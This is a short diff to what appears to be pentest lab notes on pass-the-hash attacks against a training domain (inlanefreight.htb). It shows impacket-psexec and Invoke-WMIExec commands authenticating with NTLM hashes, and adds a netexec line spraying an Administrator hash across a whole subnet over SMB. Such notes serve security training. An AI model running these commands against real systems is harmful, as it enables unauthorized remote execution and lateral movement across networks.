@@ -238,10 +238,10 @@ Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F1
 
 ## Linux
 
-### Impacket
-
 ```bash
+# impacket
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
-
+# netexec
+nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
